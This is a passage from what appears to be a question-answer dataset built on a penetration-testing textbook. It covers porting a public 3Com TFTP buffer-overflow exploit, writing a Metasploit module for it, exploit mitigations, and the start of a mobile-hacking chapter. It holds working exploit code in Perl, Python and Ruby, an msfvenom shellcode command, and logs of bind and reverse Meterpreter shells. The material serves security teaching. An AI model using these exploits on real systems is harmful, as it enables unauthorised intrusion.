code\n$exploit=$exploit.$jmp_2000;| #jump to shellcode\n$exploit=$exploit.\"\\x00\"; #end of TS mode name\nprint $target $exploit; #Attack on victim\nprint \"++ Exploit packet sent ...\\n\";\nprint \"++ Done.\\n\";\nprint \"++ Telnet to 4444 on victim's machine ....\\n\";\nsleep(2);\nclose($target);\nexit;\n#----------------------------------------------------------------------------------\n# milw0rm.com [2007-02-28]\nListing 19-5: Public exploit for 3Com TFTP\n428 Chapter 19\nThis exploit is written in Perl u. To use public exploits, you will need basic\nreading knowledge in a number of languages. Additionally, this exploit tar-\ngets Windows 2000 SP4 v, whereas our target is Windows XP SP3. We will\nneed to make some changes to port this exploit to our platform. The shellcode included with this exploit claims to have been generated\nusing Metasploit and to open a bind shell on port 4444 w. note No offense intended to the original author of this exploit, but in a public exploit,\nalways be wary of anything you can’t read. Additionally, be aware that the included\nshellcode may not work for your environment. For example, it may be a reverse shell\nheaded to a static IP address and port. Therefore, it is good practice to use Msfvenom\nto generate new, trustworthy shellcode before running any public exploit. Reading through the exploit, we see that the author creates a TFTP\npacket similar to the one we created in our fuzzing example earlier in the\nchapter y. The Mode field is filled with a NOP sled of 129 characters z,\n344 bytes of shellcode {, and the four-byte return address | (in this case, a JMP\nESI instruction) to redirect execution to the attacker-controlled ESI register x. note A NOP sled is a series of no operating instructions (\\x90 in hex) that do nothing and\nmove on. They are typically used to pad exploits. Exploit developers can just redirect\nexecution to somewhere in the NOP sled, and execution will just “slide” down the NOP\nsled, doing nothing, until it reaches the shellcode. However, we have learned that we\ncan be more precise with our exploits, and we usually don’t need NOP sleds at all. The command for the variable $jmp_2000 x tells us that the exploit uses\na JMP ESI instruction in USER32.dll on Windows 2000 SP4 English. Finding a Return Address\nBecause we are using a different platform, the memory location (0x77E5080E)\nof this JMP ESI instruction may be different. USER32.dll is a component of\nthe Windows operating system. Windows XP does not use ASLR, discussed\nlater in this chapter, so USER32.dll is loaded into the same memory location\non all Windows XP SP3 English platforms. We have taken advantage of static DLL locations in our previous exploit\nexercises. We need not have a copy of 3Com TFTP running to find the\nmemory locations of instructions in Windows components. For example,\nas shown in Figure 19-4, from debugging War-FTP, we can search for a JMP\nESI instruction in USER32.dll. (It is a good idea to stick with the DLL noted\nin the original exploit if we don’t have a copy of the program. We can’t be\nsure the program loads MSVCRT.dll, for example.)\nOf course, in our case, we have 3Com TFTP locally, but if we didn’t\nhave access to the app, we could use Mona to look for JMP instructions inside\na specific module. For example, we could look for instances of JMP ESI (or\nthe equivalent) with the command !mona jmp -r esi -m user32, as shown in\nFigure 19-4. Fuzzing, Porting Exploits, and Metasploit Modules 429\nFigure 19-4: Finding JMP ESI instructions in USER32 .dll\nAnd we find a JMP ESI instruction at the memory address 7E45AE4E in\nUSER32.dll on Windows XP SP3. If we change the jmp_2000 variable to this\nvalue in little-endian format, this exploit should work for our platform. $jmp_2000 = \"\\x4E\\xAE\\x45\\x7E\";\nReplacing Shellcode\nAs noted earlier, we also need to replace the shellcode with code generated\nby Msfvenom. We can use a bind shell or any Windows payload that will fit\nin 344 + 129 bytes (the included shellcode plus the NOP sled). The only bad\ncharacter we need to avoid this time is the null byte. Tell Msfvenom to out-\nput the payload in Perl format so we can easily add it to our exploit. root@kali:~# msfvenom -p windows/shell_bind_tcp -b '\\x00' -s 473 -f perl\nEditing the Exploit\nOur generated shellcode from Msfvenom is 368 bytes, whereas the original\nshellcode in the public exploit was 344 bytes. Now make the changes to\nthe original exploit code shown in Listing 19-6. We delete the NOP sled\nand pad our exploit string with 105 bytes after the shellcode, so our return\naddress still ends up hijacking EIP. 430 Chapter 19\n#!/usr/bin/perl -w\n#===============================================================\n# 3Com TFTP Service <= 2.0.1 (Long Transporting Mode) Overflow Perl Exploit\n# By Umesh Wanve (umesh_345@yahoo.com)\n#===============================================================\n# Credits : Liu Qixu is credited with the discovery of this vulnerability.\n\n# Reference : http://www.securityfocus.com/bid/21301\n# Date : 27-02-2007\n# Tested on Windows XP SP3\n# You can replace shellcode with your favourite one :\n# Buffer overflow exists in transporting mode name of TFTP server. # So here you go. # Buffer = \"\\x00\\x02\" + \"filename\" + \"\\x00\" + nop sled + Shellcode + JUMP + \"\\x00\";\n# This was written for educational purpose. Use it at your own risk. Author will not be\nresponsible for any damage. #===============================================================\nuse IO::Socket;\nif(!($ARGV[1]))\n{\nprint \"\\n3COM Tftp long transport name exploit\\n\";\nprint \"\\tCoded by Umesh wanve\\n\\n\";\nprint \"Use: 3com_tftp.pl <host> <port>\\n\\n\";\nexit;\n}\n$target = IO::Socket::INET->new(Proto=>'udp',\nPeerAddr=>$ARGV[0],\nPeerPort=>$ARGV[1])\nor die \"Cannot connect to $ARGV[0] on port $ARGV[1]\";\nmy($shellcode) = u\n\"\\xda\\xc5\\xd9\\x74\\x24\\xf4\\x5f\\xb8\\xd4\\x9d\\x5d\\x7a\\x29\\xc9\" . --snip--\n\"\\x27\\x92\\x07\\x7e\";\nprint \"++ Building Malicious Packet .....\\n\";\n$padding=\"A\" x 105; v\n$jmp_xp = \"\\x4E\\xAE\\x45\\x7E\";w# jmp esi user32.dll windows xp sp3 english\n$exploit = \"\\x00\\x02\"; #write request (header)\n$exploit=$exploit.\"A\"; #file name\n$exploit=$exploit.\"\\x00\"; #Start of transporting name\n$exploit=$exploit.$shellcode; #shellcode\n$exploit=$exploit.$padding; #padding\n$exploit=$exploit.$jmp_xp; #jump to shellcode\n$exploit=$exploit.\"\\x00\"; #end of TS mode name\nprint $target $exploit; #Attack on victim\nprint \"++ Exploit packet sent ...\\n\";\nprint \"++ Done.\\n\";\nprint \"++ Telnet to 4444 on victim's machine ....\\n\";\nsleep(2);\nclose($target);\nexit;\n#----------------------------------------------------------------------------------------------\n# milw0rm.com [2007-02-28]\nListing 19-6: The ported exploit\nFuzzing, Porting Exploits, and Metasploit Modules 431\nOur ported exploit will look like Listing 19-6, with the shellcode u,\npadding v, and return address w adjusted to meet our needs. If you’ve done everything correctly, when you run the ported exploit, a\nbind shell with System privileges will open on TCP port 4444, as shown in\nListing 19-7. root@kali:~# ./exploitdbexploit.pl 192.168.20.10 69\n++ Building Malicious Packet ..... ++ Exploit packet sent ... ++ Done. ++ Telnet to 4444 on victim's machine .... root@kali:~# nc 192.168.20.10 4444\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp. C:\\WINDOWS\\system32>\nListing 19-7: Running the ported exploit\nwriting metasploit modules\nThroughout this book we have leveraged many Metasploit modules for\ninformation gathering, exploitation, post exploitation, and so on. As new\nvulnerabilities are discovered, Metasploit modules are written for these\nissues, often by members of the security community like you. Additionally,\nas new post-exploitation or information-gathering techniques are imple-\nmented by researchers, they are often ported into Metasploit modules. In this section, we will look at the basics of writing our own Metasploit\nexploit module. note Metasploit modules are written in Ruby. The best way to write a Metasploit module is to start with a similar exist-\ning module or skeleton and, similar to what we did in the previous section,\nport the exploit to meet our needs. Let’s begin with an existing Metasploit\nTFTP exploit module and port the 3Com TFTP stack-based buffer overflow\nthat we left as an exercise earlier in this chapter. Of course, a Metasploit\nmodule already exists for this vulnerability, but it would be too easy to use\nit as a base module. To see all the exploits for Windows TFTP servers, view the contents of\n/usr/share/metasploit-framework/modules/exploits/windows/tftp in Kali. We’ll start with the module futuresoft_transfermode.rb. This module (shown\nin Listing 19-8) exploits a similar issue: a buffer overflow in the transfer\nmode field of another piece of TFTP software. We will adapt it for our 3Com\nTFTP exploit module. 432 Chapter 19\nroot@kali:/usr/share/metasploit-framework/modules/exploits/windows/tftp# cat\nfuturesoft_transfermode.rb\n##\n# This module requires Metasploit: http//metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nrequire 'msf/core'\nclass Metasploit3 < Msf::Exploit::Remote u\nRank = AverageRanking\ninclude Msf::Exploit::Remote::Udp v\ninclude Msf::Exploit::Remote::Seh\ndef initialize(info = {})\nsuper(update_info(info,\n'Name' => 'FutureSoft TFTP Server 2000 Transfer-Mode Overflow',\n'Description' => %q{\nThis module exploits a stack buffer overflow in the FutureSoft TFTP Server\n2000 product. By sending an overly long transfer-mode string, we were able\nto overwrite both the SEH and the saved EIP. A subsequent write-exception\nthat will occur allows the transferring of execution to our shellcode\nvia the overwritten SEH. This module has been tested against Windows\n2000 Professional and for some reason does not seem to work against\nWindows 2000 Server (could not trigger the overflow at all). },\n'Author' => 'MC',\n'References' =>\n[\n['CVE', '2005-1812'],\n['OSVDB', '16954'],\n['BID', '13821'],\n['URL', 'http://www.security.org.sg/vuln/tftp2000-1001.html'],\n],\n'DefaultOptions' =>\n{\n'EXITFUNC' => 'process',\n},\n'Payload' =>\n{\n'Space' => 350, w\n'BadChars' => \"\\x00\", x\n'StackAdjustment' => -3500, y\n},\n'Platform' => 'win',\n'Targets' => z\n[\n['Windows 2000 Pro English ALL', { 'Ret' => 0x75022ac4} ], # ws2help.dll\n['Windows XP Pro SP0/SP1 English', { 'Ret' => 0x71aa32ad} ], # ws2help.dll\n['Windows NT SP5/SP6a English', { 'Ret' => 0x776a1799} ], # ws2help.dll\n['Windows 2003 Server English', { 'Ret' => 0x7ffc0638} ], # PEB return\n],\nFuzzing, Porting Exploits, and Metasploit Modules 433\n'Privileged' => true,\n'DisclosureDate' => 'May 31 2005'))\nregister_options(\n[\nOpt::RPORT(69) {\n], self.class)\nend |\ndef exploit\nconnect_udp}\nprint_status(\"Trying target #{target.name}...\")\nsploit = \"\\x00\\x01\" + rand_text_english(14, payload_badchars) + \"\\x00\"\nsploit += rand_text_english(167, payload_badchars)\nseh = generate_seh_payload(target.ret)\nsploit[157, seh.length] = seh\nsploit += \"\\x00\"\nudp_sock.put(sploit) ~\nhandler\ndisconnect_udp\nend\nend\nListing 19-8: Metasploit module example\nIn the class definition u, as well as the include statements v, the author\nof this module tells Metasploit which mixins, or libraries, the module will\ninherit constructs from. This is a remote exploit over UDP that uses an SEH\noverwrite attack. In the Payload section w, we tell Metasploit how many bytes we have avail-\nable in the attack string for the payload. We also list the bad characters that\nneed to be avoided x. The StackAdjustment option y tells Metasploit to move\nESP to the beginning of the payload to make more room on the stack for the\npayload to do its work without overwriting itself. In the Targets section z, the author lists all the targets that Metasploit\ncan attack together with their relevant return addresses. (Note that we\ndo not have to write return addresses in little-endian format. We will take\ncare of this later in the module.) In addition to the default options for the\nExploit::Remote::UDP mixin, the author also registered the RPORT option as\n69 {, the default port for TFTP. Many programming languages use brackets\nto designate blocks such as functions or loops. Python uses indentation, and\nRuby (the language used here) uses the word end | to designate the end of a\nblock. 434 Chapter 19\nThe Exploit::Remote::UDP mixin does all the work of setting up a UDP\nsocket for us. All we need to do is call the function connect_udp }. (You’ll\nfind the details of connect_udp and other Exploit::Remote::UDP methods at\n/usr/share/metasploit-framework/lib/msf/core/exploit/udp.rb in Kali.)\nThe author then tells Metasploit how to create the exploit string. After\nthe exploit string is built, the author uses the udp_sock.put method ~ to send\nit to the vulnerable server. A Similar Exploit String Module\nThe example module uses an SEH exploit, whereas our 3Com TFTP\nexploit uses a saved return pointer, so let’s look at the exploit string in\nanother Metasploit TFTP example for help in creating our exploit. Here\nis the exploit string used in the exploit/windows/tftp/tftpd32_long_filename.rb\nmodule. sploit = \"\\x00\\x01\"u + rand_text_english(120, payload_badchars)v + \".\" +\nrand_text_english(135, payload_badchars) + [target.ret].pack('V')w + payload. encodedx + \"\\x00\"\nRecall that the first two bytes of a TFTP packet are the opcode u. Here,\nthe packet is telling the TFTP we want to read a file. Next is the filename,\nrand_text_english(120, payload_badchars). As the module name suggests, rather\nthan writing too much data into the transport mode field, this exploit uses\na long filename. The author uses Metasploit’s rand_text_english function to\ncreate a 120-character string that avoids any bad characters by pulling from\nthe BadChar variable earlier in the module v. This exploit seems to require a\nperiod (.) and then some more random text, after which the return address\nis added to the string. Metasploit pulls the return address from the ret vari-\nable defined earlier in the module. pack is a Ruby method that turns an array into a binary sequence\naccording to a template. The 'V' template w directs Ruby to pack our\nreturn address in little-endian format. Following the return address, the\nuser’s chosen payload is encoded and appended to the exploit string, and\nthe payload fills the total space allowed, as defined in the Space variable x. A null byte signals the end of the filename field. (Interestingly, the attack\nstring does not even need to finish the TFTP packet to exploit the program,\nbecause the mode and final null byte are not appended to the exploit\nstring.)\nPorting Our Exploit Code\nEarlier in this chapter, I suggested writing an exploit for the 3Com TFTP\nserver long transport mode vulnerability as an exercise. Your finished exploit\nshould be similar to the code shown in Listing 19-9. If you didn’t try writing\nthis exploit, you should still be able to sort out how the code works, having\nworked through the previous examples.\n\nFuzzing, Porting Exploits, and Metasploit Modules 435\n#!/usr/bin/python\nimport socket\nu shellcode = (\"\\x33\\xc9\\x83\\xe9\\xb0\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\\nx1d\" + \"\\x4d\\x2f\\xe8\\x83\\xeb\\xfc\\xe2\\xf4\\xe1\\x27\\xc4\\xa5\\xf5\\xb4\\xd0\\x17\" +\n--snip--\n\"\\x4e\\xb2\\xf9\\x17\\xcd\\x4d\\x2f\\xe8\")\nbuffer = shellcode + \"A\" * 129 + \"\\xD3\\x31\\xC1\\x77\" v\npacket = \"\\x00\\x02\" + \"Georgia\" + \"\\x00\" + buffer + \"\\x00\"\ns=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\ns.sendto(packet,('192.168.20.10',69))\nresponse = s.recvfrom(2048)\nprint response\nListing 19-9: Finished 3Com TFTP Python exploit\nYour return address may point to another JMP ESI instruction v, and\nyou may have used a different payload u. Now let’s port the Python exploit into Metasploit, changing values in\nthe FutureSoft TFTP example module to fit our needs. We need to make\nonly a few changes to the existing exploit module we discussed previously,\nas shown in Listings 19-10 and 19-11. ##\n# This module requires Metasploit: http//metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nrequire 'msf/core'\nclass Metasploit3 < Msf::Exploit::Remote\nRank = AverageRanking\ninclude Msf::Exploit::Remote::Udp u\ndef initialize(info = {})\nsuper(update_info(info,\n'Name' => '3com TFTP Long Mode Buffer Overflow',\n'Description' => %q{\nThis module exploits a buffer overflow in the 3com TFTP version 2.0.1 and below with\na long TFTP transport mode field in the TFTP packet. },\n'Author' => 'Georgia',\n'References' => v\n[\n['CVE', '2006-6183'],\n['OSVDB', '30759'],\n['BID', '21301'],\n['URL', 'http://www.security.org.sg/vuln/tftp2000-1001.html'],\n],\n'DefaultOptions' =>\n{\n'EXITFUNC' => 'process',\n436 Chapter 19\n},\n'Payload' =>\n{\n'Space' => 473, w\n'BadChars' => \"\\x00\",\n'StackAdjustment' => -3500,\n},\n'Platform' => 'win',\n'Targets' =>\n[\n['Windows XP Pro SP3 English', { 'Ret' => 0x7E45AE4E } ], #JMP ESI USER32.dll x\n],\n'Privileged' => true,\n'DefaultTarget' => 0, y\n'DisclosureDate' => 'Nov 27 2006'))\nregister_options(\n[\nOpt::RPORT(69)\n], self.class)\nend\nListing 19-10: Edited module, part 1\nBecause this is a saved return pointer overwrite exploit, we will\nnot need to import the SEH Metasploit mixin; we will only import\nMsf::Exploit::Remote::Udp u. Next we change the module’s information to\nmatch the 3Com TFTP 2.0.1 long transport mode vulnerability to enable\nMetasploit users to search for our module and verify that they have the cor-\nrect exploit for the vulnerability. Search vulnerability references online to\nfind the CVE, OSVDB, and BID numbers, and any other relevant links v. Next we change the payload options to match our 3Com exploit. In our\nPython exploit, we lead with 344 bytes of shellcode, followed by 129 bytes\nof padding, giving us a total of 473 bytes to work with for the payload. Tell\nMetasploit to create a 473-byte payload at w. For the target section, our\nPython exploit covers only one platform, Windows XP Professional SP3\nEnglish. If we were submitting our exploit to the Metasploit repositories,\nwe should try to cover as many exploitable targets as possible. Finally, change the RET to the JMP ESI in USER32.dll x from the Python\nexploit. We’ve also added the DefaultTarget option to tell Metasploit to use\ntarget 0 by default, so the user won’t need to set a target before running the\nmodule y. The only changes we need to make in the exploit portion of the mod-\nule are to the exploit string itself, as shown in Listing 19-11. def exploit\nconnect_udp\nprint_status(\"Trying target #{target.name}...\")\nFuzzing, Porting Exploits, and Metasploit Modules 437\nsploit = \"\\x00\\x02\"u + rand_text_english(7, payload_badchars)v + \"\\x00\"w\nsploit += payload.encodedx + [target.ret].pack('V')y + \"\\x00\"z\nudp_sock.put(sploit)\nhandler\ndisconnect_udp\nend\nend {\nListing 19-11: Edited module, part 2\nAs in the Python exploit, we start by telling the TFTP server to write\nto a file u. We then use the rand_text_english function to create a random\nseven-character filename v. This method is superior to using static letters\nas we did in the Python exploit, because anything that is predictable can\nbe used to write signatures for antivirus programs, intrusion-prevention\nsystems, and so on. Next we follow the specification for a TFTP packet with\na null byte to finish the filename at w, and then tack on the user’s chosen\npayload x and the return address y. We finish the packet with a null byte,\nper the TFTP specification z. (After using end to close the exploit function,\ndon’t forget to close the module as well at {.)\nWe have now written an exploit module for the 3Com TFTP 2.0.1 long\ntransport mode vulnerability. Save the file in /root/.msf4/modules/exploits/\nwindows/tftp/myexploit.rb, and then run the Msftidy tool on the module to\nverify that it meets the format specifications for Metasploit modules. Make\nany formatting changes that Msftidy suggests before submitting a module to\nthe Metasploit repository. root@kali:~# cd /usr/share/metasploit-framework/tools/\nroot@kali:/usr/share/metasploit-framework/tools# ./msftidy.rb /root/.msf4/\nmodules/exploits/windows/tftp/myexploit.rb\nnote From time to time, Metasploit makes changes to its desired syntax, so run msfupdate\nto get the latest version of Msftidy if you are actually going to submit a module to the\nrepositories. In this case, we don’t need to worry about it, and running msfupdate\nmay cause other exercises in the book to break, so I don’t recommend it for now. Restart Msfconsole to load the latest modules, including any in this\n.msf4/modules directory. If you have made any syntax errors, Metasploit will\ndisplay the details of the modules it was unable to load. Now use your new exploit module to attack your Windows XP target. As\nyou see in Listing 19-12, Metasploit can fit many payloads in 473 characters,\nincluding Meterpreter u. msf > use windows/tftp/myexploit\nmsf exploit(myexploit) > show options\nModule options (exploit/windows/tftp/myexploit):\n438 Chapter 19\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOST yes The target address\nRPORT 69 yes The target port\nExploit target:\nId Name\n-- ----\n0 Windows XP Pro SP3 English\nmsf exploit(myexploit) > set RHOST 192.168.20.10\nRHOST => 192.168.20.10\nmsf exploit(myexploit) > show payloads\n--snip--\nmsf exploit(myexploit) > set payload windows/meterpreter/reverse_tcpu\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(myexploit) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(myexploit) > exploit\n[*] Started reverse handler on 192.168.20.9:4444\n[*] Trying target Windows XP Pro SP3 English... [*] Sending stage (752128 bytes) to 192.168.20.10\n[*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:4662) at\n2015-02-09 09:28:35 -0500\nmeterpreter >\nListing 19-12: Using your module\nNow that we’ve walked through one example of writing a Metasploit\nmodule, here’s an idea for another. A Metasploit module that can exploit\nthe War-FTP 1.65 USER buffer overflow, found at /usr/share/metasploit\n-framework/modules/exploits/windows/ftp/warftpd_165_user.rb, uses the saved\nreturn pointer overwrite technique. Try writing a similar module that uses\nthe SEH overwrite technique we worked through in Chapter 18. exploitation mitigation techniques\nWe discussed one exploit mitigation technique, called SafeSEH, in Chapter 18. In typical cat-and-mouse fashion, attackers develop new exploitation tech-\nniques while platforms implement mitigation techniques, and then attack-\ners come up with something new. Here we will briefly discuss a few modern\nexploit mitigation methods. This list is by no means complete, nor is it\nwithin the scope of this book to discuss writing exploits that successfully\nbypass all these restrictions. There are many advanced exploitation and\npayload delivery techniques, such as heap sprays and return-oriented pro-\ngramming, beyond those discussed here. Check out my website (http://www\n.bulbsecurity.com/) and the Corelan Team’s website (http://www.corelan.be/)\nfor more information on advanced exploit development techniques. Fuzzing, Porting Exploits, and Metasploit Modules 439\nStack Cookies\nNaturally, as buffer overflow exploits became prevalent, developers wanted\nto stop these sorts of attacks from hijacking execution. One way to do so is\nby implementing stack cookies, also known as canaries. At the start of a pro-\ngram, a stack cookie is calculated and added to the .data section of memory. Functions that use structures prone to buffer overflows, such as string buf-\nfers, grab the canary value from .data and push it onto the stack after the\nsaved return address and EBP. Just before a function returns, it checks the\nvalue of the canary on the stack against the value in .data. If the values\ndon’t match, a buffer overflow is detected, and the program is terminated\nbefore the attack can hijack execution. You can use multiple techniques for bypassing stack cookies, such as\ntriggering an SEH overwrite and exception before the vulnerable function\nreturns and hijacking execution before the canary value is checked. Address Space Layout Randomization\nThe exploits we have written in this book have relied on certain instruc-\ntions being at certain memory addresses. For example, in our first War-FTP\nstack-based buffer overflow example in Chapter 17, we relied on a JMP ESP\nequivalent instruction in the Windows MSVCRT.dll module being at memory\naddress 0x77C35459 on all Windows XP SP3 English systems. In our SEH over-\nwrite example in Chapter 18, we relied on the POP POP RET instructions in War-\nFTP’s MFC42.dll module being at memory address 0x5F4580CA. If neither case\nwere true, our entire attack approach would have been undermined, and we\nwould have to find the instructions before we could execute them. When ASLR is implemented, you can’t count on certain instructions\nbeing at certain memory addresses. To see ASLR in action, open the Winamp\nprogram in Immunity Debugger on your Windows 7 virtual machine. Note\nthe memory locations of Winamp.exe and some Windows DLLs such as\nUSER32 and SHELL32. Now restart the system and try again. You should\nnotice that the locations of the Windows components change at reboot while\nthe location of Winamp.exe stays the same.",
    "question": "What is the process for porting an existing exploit for a different TFTP server version, such as 3Com TFTP 2.0.1, into a Metasploit module?",
    "summary": "The text describes how to fuzz a 3Com TFTP server to find a buffer overflow vulnerability and then port the exploit into a Metasploit module. It explains the process of creating a TFTP packet with a long Mode field, identifying the crash point, and adjusting the return address and shellcode to work on Windows XP SP3. The final step involves writing a Metasploit module that uses the same technique, ensuring it follows the correct format and syntax for the framework."
  },
  {
    "start": 122,
    "end": 128,
    "text": "In my case, the first time I looked\nat Winamp in Immunity Debugger, the memory locations were as follows:\n• 00400000 Winamp.exe\n• 778B0000 USER32.dll\n• 76710000 SHELL32.dll\nAfter reboot they looked like this:\n• 00400000 Winamp.exe\n• 770C0000 USER32.dll\n• 75810000 SHELL32.dll\nLike SafeSEH, there is no rule in Windows that programs must imple-\nment ASLR. Even some Windows applications such as Internet Explorer\ndidn’t implement ASLR right away. However, Windows Vista and later\n440 Chapter 19\nshared libraries such as USER32.dll and SHELL32.dll do use ASLR. If we\nwant to use any code in these libraries, we will not be able to call instruc-\ntions directly from a static address. Data Execution Prevention\nIn the exploits we developed in the past few chapters, we relied on the abil-\nity to inject our shellcode into memory somewhere, pass execution to the\nshellcode, and have the shellcode execute. Data execution prevention (DEP)\nmakes this a little harder by designating specific parts of memory as non-\nexecutable. If an attacker tries to execute code from nonexecutable memory,\nthe attack will fail. DEP is used in most modern versions of Windows, as well as Linux,\nMac OS, and even Android platforms. iOS does not require DEP, as dis-\ncussed in the next section. To bypass DEP, attackers typically use a technique called return-oriented\nprogramming (ROP). ROP allows attackers to execute specific instructions\nalready included in executable memory. One common technique is to use\nROP to create a section of memory that is writable and executable, and\nthen write the payload to this memory segment and execute it. Mandatory Code Signing\nApple’s iOS team takes a different approach to preventing malicious code\nfrom executing. All code that executes on an iPhone must be signed by a\ntrusted authority, usually Apple itself. To run an application on an iPhone,\ndevelopers must submit the code for Apple’s review. If Apple determines\nthat their app is not malicious, it is usually approved and the code is signed\nby Apple. One common route that malware authors take to bypass detection\nat install time is downloading new, potentially malicious code at runtime\nand executing it. However, because all memory pages must be signed by\na trusted authority, this sort of attack will fall flat on an iPhone. As soon\nas the application attempts to run unsigned code, the CPU will reject it,\nand the application will crash. DEP is not required, because mandatory\ncode signing takes the protection a step further. Of course, it is possible to write exploits that bypass these restrictions,\nas with iPhone jailbreaks, but on the latest versions of iOS, a jailbreak is no\nsmall feat. Rather than using ROP briefly to create a DEP bypass, with man-\ndatory code signing, the entire payload must be created using ROP. One mitigation technique alone is not enough to foil the most skilled\nexploit developers armed with the latest methods. As a result, exploit miti-\ngation techniques are typically chained together to further foil attacks. For\nexample, iOS uses both mandatory code signing and full ASLR. Thus, an\nattacker has to use ROP for the entire payload, and thanks to ASLR, build-\ning a ROP payload is no picnic. Fuzzing, Porting Exploits, and Metasploit Modules 441\nIn the previous two chapters, we have covered a solid introduction to\nexploit development. Building on the skills we discussed, you can move on\nto more advanced exploitation—even taking out the latest, most secure\nplatforms and programs. summary\nIn this chapter we looked at a few odds and ends for basic exploit development. We looked at a technique called fuzzing in order to find potential exploitation\npoints. We also looked at working with public exploits and porting them\nto meet our needs. We replaced the shellcode using Msfvenom and found\na return address that works with our platform. Next we looked at porting a\ncompleted Python exploit into our first Metasploit module. Starting with\na module for a similar issue, we made changes to fit the 3Com TFTP long\ntransport mode buffer overflow vulnerability. Finally, we talked briefly\nabout some of the exploitation mitigation techniques that you will encoun-\nter as you continue your study of exploit development. We are nearing the end of our journey into the basics of penetration\ntesting. Let’s finish up with a chapter on assessing the security of mobile\ndevices. 442 Chapter 19\nPaRT V\nmoBile HaCking\n20\nusing tHe smartPHone\nPentest fr ame work\nBring your own device (BYOD) is a big buzzword in the\nindustry right now. Though we’ve been bringing our\nown devices to work in one form or another for years\n(contractor laptops or that game console someone\nleft connected to the network in the breakroom, for example), mobile\ndevices are now entering the workplace en masse, and it falls to security\nteams and pentesters to evaluate the security risks of these devices. In this chapter, we’ll focus on tools and attacks for assessing the secu-\nrity of mobile devices. Mobile technology is a rapidly developing field, and\nthough we can cover only the basics here, developing new mobile attacks\nand post-exploitation techniques is an ideal place to start with your own\nsecurity research. For example, we’ll be discussing a tool I created to help\npentesters to assess the security posture of mobile devices, the Smartphone\nPentest Framework (SPF). After working your way through this book, you will\nbe ready to embark on your own infosec journey and perhaps write a tool of\nyour own. For most of the examples in this chapter, we’ll use the Android plat-\nform as a target because, in addition to being the most ubiquitous platform,\nit also allows you to create emulators on Windows, Linux, and Mac OS plat-\nforms. Although we’ll focus on Android, we’ll also explore an attack on a\njailbroken iPhone. mobile attack Vectors\nThough mobile devices run operating systems, speak TCP/IP, and access\na lot of the same resources that traditional computers do, they also have\ntheir own unique features that add new attack vectors and protocols to the\nmix. Some features have been causing security problems on devices for years,\nwhile others such as near field communication, discussed later, are fairly new. Text Messages\nMany mobile devices can send and receive text (SMS) messages. Though\nlimited in size, text messages allow users to communicate almost simultane-\nously, often replacing email for written communications. SMS opens up a\nnew social-engineering attack vector. Traditionally, email has been the medium for sending spam and phish-\ning attempts, but even free email solutions do a decent job of filtering out\nthe garbage these days. (If you ever need a laugh at work, check your email\nspam folder.) SMS is a different story: Although some mobile antivirus suites\nallow you to blacklist and whitelist certain mobile numbers, generally if you\ntext a number to a device, the message will be received. This makes SMS an\nideal vector for spam and phishing attacks. We’re already seeing annoying mobile ads and SMS phishing attempts\nthat lure users to a counterfeit website to enter their credentials, much\nlike the site-cloning attacks from Chapter 11. These attacks will no doubt\nbecome more prevalent as time goes on. Security-awareness training will\nneed to be augmented to include this threat. A user who knows better than\nto click a random link in a suspicious-looking email may still click a random\nlink in a text message. After all, it’s just a text—how could a text possibly\nhurt you? But that link will open in the mobile browser or another app that\nmay contain additional vulnerabilities. Near Field Communication\nMobile devices bring yet another attack vector to the table: near field com-\nmunication, or NFC. NFC allows devices to share data by touching or\nbeing near each other. Mobile devices with NFC enabled can scan NFC\ntags to automate tasks such as changing settings or opening applications. Some can beam data, such as a photo or an entire app, from one device\nto another. NFC is another ideal social-engineering attack vector. For\nexample, in Mobile Pwn2Own 2013, an exploitation contest, researchers\nused NFC to attack an Android device by beaming a malicious payload\n446 Chapter 20\nto a vulnerable application on the device. Therefore, security awareness\ntraining should also teach users to be aware of which NFC tags their device\nresponds to and who they are beaming data with. QR Codes\nQuick response (QR) codes are matrix barcodes originally developed for use\nin auto manufacturing. QR codes can embed URLs, send data to an appli-\ncation on a mobile device, and so on, and users should be aware that what\nthey are scanning may open something malicious. That QR code on a store\nwindow doesn’t have to point to the store’s website, and malicious QR code\nattacks have occurred in the wild. For instance, one prominent hacktivist\nchanged his Twitter profile picture to a QR code, prompting many curious\nusers to scan it with their phones. The QR code directed them to a mali-\ncious web page that attempted to exploit vulnerabilities in WebKit, a web\npage rendering engine used by both iOS and Android. the smartphone Pentest Framework\nEnough talk; let’s turn our attention to actually attacking mobile devices\nwith the help of SPF. SPF is still under active development and its feature\nset changes rapidly. By the time you work through this section, many of the\nmenus may offer additional options. In Chapter 1, you downloaded the ver-\nsion of the SPF used in this book, but to get the main and most up-to-date\nbranch of SPF, visit https://github.com/georgiaw/Smartphone-Pentest-Framework .git/. Setting Up SPF\nIf you followed the instructions in Chapter 1, SPF should be all set up and\nready to go. Because SPF uses Kali’s built-in web server to deliver some pay-\nloads, make sure that the Apache server is running, as shown here. root@kali:~/Smartphone-Pentest-Framework/frameworkconsole# service apache2 start\nAdditionally, SPF records information in either a MySQL or PostgreSQL\ndatabase. Make sure the MySQL database is started, as shown here. root@kali:~/Smartphone-Pentest-Framework/frameworkconsole# service mysql start\nThe last thing to do is edit our SPF configuration file, /root/Smartphone\n-Pentest-Framework/frameworkconsole/config, to match our environment. The\ndefault configuration file is shown in Listing 20-1. root@kali:~/Smartphone-Pentest-Framework/frameworkconsole# cat config\n#SMARTPHONE PENTEST FRAMEWORK CONFIG FILE\n#ROOT DIRECTORY FOR THE WEBSERVER THAT WILL HOST OUR FILES\nWEBSERVER = /var/www\n#IPADDRESS FOR WEBSERVER (webserver needs to be listening on this address)\nIPADDRESS = 192.168.20.9 u\nUsing the Smartphone Pentest Framework 447\n#IP ADDRESS TO LISTEN ON FOR SHELLS\nSHELLIPADDRESS = 192.168.20.9 v\n#IP ADDRESS OF SQLSERVER 127.0.0.1 IF LOCALHOST\nMYSQLSERVER = 127.0.0.1\n--snip--\n#NMAP FOR ANDROID LOCATION\nANDROIDNMAPLOC = 